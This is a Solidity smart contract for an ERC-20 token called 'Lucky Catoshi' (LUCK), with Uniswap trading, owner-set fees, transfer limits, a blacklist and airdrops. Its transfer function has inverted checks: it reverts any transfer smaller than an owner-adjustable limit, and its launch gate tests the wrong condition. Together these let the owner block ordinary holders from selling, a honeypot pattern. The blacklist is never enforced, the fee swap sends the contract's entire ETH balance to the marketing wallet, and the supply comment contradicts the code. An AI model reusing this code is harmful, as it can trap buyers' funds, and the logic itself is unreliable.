// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

error NotLaunched();
error InvalidInput();
error BlacklistDectected();
error InvalidBalanceOf(address account);
error InvalidSwapAmountConfig();
error InvalidFeeConfig();
error InvalidTxAmount();
error InvalidWalletAmount();

contract LuckyCatoshiToken is ERC20PresetFixedSupply, Ownable {
    using SafeMath for uint256;
    address public marketingWallet = 0xd1665Cc71Df93b8E5eb9D4750eE6BDd7f14C7841;
    address public devWallet = 0xd1665Cc71Df93b8E5eb9D4750eE6BDd7f14C7841;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string private _name = "Lucky Catoshi";
    string private _symbol = "LUCK";
    uint8 private _decimals = 9;
    bool public launched;

    uint256 private _totalSupply = 1 * 10 ** 9 * 10 ** _decimals; // 10B
    uint256 public maxTxAmount = _totalSupply;
    uint256 public maxWalletToken = _totalSupply;
    uint256 public swapTokensAtAmount = (_totalSupply * 1) / 1000;

    uint256 public buyTotalFees;
    uint256 private _buyMarketingFee;
    uint256 private _buyDevelopmentFee;
    uint256 private _buyLiquidityFee;

    uint256 public sellTotalFees;
    uint256 private _sellMarketingFee;
    uint256 private _sellDevelopmentFee;
    uint256 private _sellLiquidityFee;

    uint256 private _tokensForMarketing;
    uint256 private _tokensForDevelopment;
    uint256 private _tokensForLiquidity;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public isTxLimitExempt;
    mapping(address => bool) public isMarketPair;
    mapping(address => bool) public blacklists;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    event Launch();
    event AdminGranted(address indexed account, bool isAdmin);

    bool public swapping;
    modifier onlySwapping() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor()
        Ownable()
        ERC20PresetFixedSupply(_name, _symbol, _totalSupply, msg.sender)
    {
        uniswapV2Router = IUniswapV2Router02(
            0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        _approve(address(this), address(uniswapV2Router), _totalSupply);

        _buyMarketingFee = 0;
        _buyDevelopmentFee = 0;
        _buyLiquidityFee = 0;
        buyTotalFees = _buyMarketingFee + _buyDevelopmentFee + _buyLiquidityFee;

        _sellMarketingFee = 0;
        _sellDevelopmentFee = 0;
        _sellLiquidityFee = 0;
        sellTotalFees =
            _sellMarketingFee +
            _sellDevelopmentFee +
            _sellLiquidityFee;

        _grantAllAccess(owner(), true);
        _grantAllAccess(address(this), true);

        isExcludedFromFee[devWallet] = true;
        isExcludedFromFee[marketingWallet] = true;

        isWalletLimitExempt[uniswapV2Pair] = true;
        isWalletLimitExempt[DEAD] = true;
        isWalletLimitExempt[ZERO] = true;

        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[ZERO] = true;

        isMarketPair[uniswapV2Pair] = true;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function setBlacklist(
        address _address,
        bool _isBlacklisting
    ) external onlyOwner {
        blacklists[_address] = _isBlacklisting;
    }

    function setMarketPairStatus(address pair, bool status) public onlyOwner {
        isMarketPair[pair] = status;
    }

    function setLaunch() external onlyOwner {
        launched = true;
        emit Launch();
    }

    function setLimitsTx(
        uint256 _maxTxAmount,
        uint256 _maxWalletToken
    ) external onlyOwner {
        maxTxAmount = _maxTxAmount;
        maxWalletToken = _maxWalletToken;
    }

    function removeLimitsTx() external onlyOwner {
        maxTxAmount = _totalSupply;
        maxWalletToken = _totalSupply;
    }

    function setSwapTokensAtAmount(uint256 ratio_base1000) external onlyOwner {
        if (ratio_base1000 < 1 || ratio_base1000 > 5)
            revert InvalidSwapAmountConfig();
        swapTokensAtAmount = (_totalSupply * ratio_base1000) / 1000;
    }

    function setBuyFees(
        uint256 _marketingFee,
        uint256 _developmentFee,
        uint256 _liquidityFee
    ) public onlyOwner {
        if (_marketingFee + _developmentFee + _liquidityFee > 30) {
            revert InvalidFeeConfig();
        }
        _buyMarketingFee = _marketingFee;
        _buyDevelopmentFee = _developmentFee;
        _buyLiquidityFee = _liquidityFee;
        buyTotalFees = _buyMarketingFee + _buyDevelopmentFee + _buyLiquidityFee;
    }

    function setSellFees(
        uint256 _marketingFee,
        uint256 _developmentFee,
        uint256 _liquidityFee
    ) public onlyOwner {
        if (_marketingFee + _developmentFee + _liquidityFee > 30) {
            revert InvalidFeeConfig();
        }
        _sellMarketingFee = _marketingFee;
        _sellDevelopmentFee = _developmentFee;
        _sellLiquidityFee = _liquidityFee;
        sellTotalFees =
            _sellMarketingFee +
            _sellDevelopmentFee +
            _sellLiquidityFee;
    }

    function grantAllAccess(address account, bool value) external onlyOwner {
        _grantAllAccess(account, value);
    }

    function transferToAddressETH(
        address payable recipient,
        uint256 amount
    ) private {
        recipient.transfer(amount);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    // airdrop from mint token or minted token
    function airdrop(
        address[] memory _addresses,
        uint256[] memory _amounts,
        uint256 _totalAmount
    ) external onlyOwner {
        if (balanceOf(msg.sender) < _totalAmount)
            revert InvalidBalanceOf(msg.sender);

        if (_addresses.length != _amounts.length) revert InvalidInput();

        for (uint256 i = 0; i < _addresses.length; i++) {
            _transfer(msg.sender, _addresses[i], _amounts[i]);
        }
    }

    // The following functions are overrides required by Solidity.

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (!launched && !isExcludedFromFee[from] && isExcludedFromFee[to])
            revert NotLaunched();

        if (
            !isTxLimitExempt[from] &&
            !isTxLimitExempt[to] &&
            amount < maxTxAmount
        ) revert InvalidTxAmount();

        if (!isWalletLimitExempt[to] && balanceOf(to) + amount > maxWalletToken)
            revert InvalidWalletAmount();

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        bool canSwap = balanceOf(address(this)) >= swapTokensAtAmount;

        if (
            canSwap &&
            !swapping &&
            !isMarketPair[from] &&
            !isExcludedFromFee[from] &&
            !isExcludedFromFee[to]
        ) {
            _swapAndAddLiquidity();
        }

        bool takeFee = !swapping &&
            !isExcludedFromFee[from] &&
            !isExcludedFromFee[to];

        uint256 fees;
        if (takeFee) {
            if (isMarketPair[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(1000);
                _tokensForLiquidity += (fees * _buyLiquidityFee) / buyTotalFees;
                _tokensForMarketing += (fees * _buyMarketingFee) / buyTotalFees;
                _tokensForDevelopment +=
                    (fees * _buyDevelopmentFee) /
                    buyTotalFees;
            } else if (isMarketPair[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(1000);
                _tokensForLiquidity +=
                    (fees * _sellLiquidityFee) /
                    sellTotalFees;
                _tokensForMarketing +=
                    (fees * _sellMarketingFee) /
                    sellTotalFees;
                _tokensForDevelopment +=
                    (fees * _sellDevelopmentFee) /
                    sellTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }

        super._transfer(from, to, amount.sub(fees));
    }

    function _swapAndAddLiquidity() internal onlySwapping {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = _tokensForLiquidity +
            _tokensForMarketing +
            _tokensForDevelopment;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 10) {
            contractBalance = swapTokensAtAmount * 10;
        }

        bool success;
        uint256 liquidityTokens = (contractBalance * _tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        _swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMarketing = ethBalance.mul(_tokensForMarketing).div(
            totalTokensToSwap
        );
        (success, ) = address(marketingWallet).call{
            value: address(this).balance
        }("");

        uint256 ethForDevelopment = ethBalance.mul(_tokensForDevelopment).div(
            totalTokensToSwap
        );
        (success, ) = address(devWallet).call{value: ethForDevelopment}("");

        uint256 ethForLiquidity = ethBalance -
            ethForMarketing -
            ethForDevelopment;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
        }

        _tokensForLiquidity = 0;
        _tokensForMarketing = 0;
        _tokensForDevelopment = 0;
    }

    function _swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function _grantAllAccess(address account, bool value) internal virtual {
        isExcludedFromFee[account] = value;
        isWalletLimitExempt[account] = value;
        isTxLimitExempt[account] = value;
        emit AdminGranted(account, value);
    }
}
